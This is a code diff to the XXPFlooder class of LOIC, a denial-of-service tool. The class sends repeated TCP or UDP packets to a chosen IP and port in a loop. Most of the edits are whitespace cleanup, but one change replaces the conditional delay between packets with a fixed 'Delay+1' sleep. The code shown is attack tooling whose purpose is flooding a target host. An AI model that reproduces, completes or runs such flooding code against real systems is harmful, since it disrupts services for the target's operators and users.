@@ -7,21 +7,13 @@ namespace LOIC
 	public class XXPFlooder
 	{
 		public bool IsFlooding { get; set; }
-
 		public int FloodCount { get; set; }
-
 		public string IP { get; set; }
-
 		public int Port { get; set; }
-
 		public int Protocol { get; set; }
-
 		public int Delay { get; set; }
-
 		public bool Resp { get; set; }
-
 		public string Data { get; set; }
-
         	private bool random;
 
 		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
@@ -32,9 +24,8 @@ namespace LOIC
 			this.Delay = delay;
 			this.Resp = resp;
 			this.Data = data;
-   		        this.random = random;
+			this.random = random;
 		}
-
 		public void Start()
 		{
 			IsFlooding = true;
@@ -42,7 +33,6 @@ namespace LOIC
 			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
 			bw.RunWorkerAsync();
 		}
-
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
 			try
@@ -72,7 +62,7 @@ namespace LOIC
 							{
 								FloodCount++;
 								socket.Send(buf);
-								if (Delay > 0) System.Threading.Thread.Sleep(Delay);
+								System.Threading.Thread.Sleep(Delay+1);
 							}
 						}
 						catch { }
@@ -87,7 +77,7 @@ namespace LOIC
 							{
 								FloodCount++;
 								socket.SendTo(buf, SocketFlags.None, RHost);
-								if (Delay > 0) System.Threading.Thread.Sleep(Delay);
+								System.Threading.Thread.Sleep(Delay+1);
 							}
 						}
 						catch { }
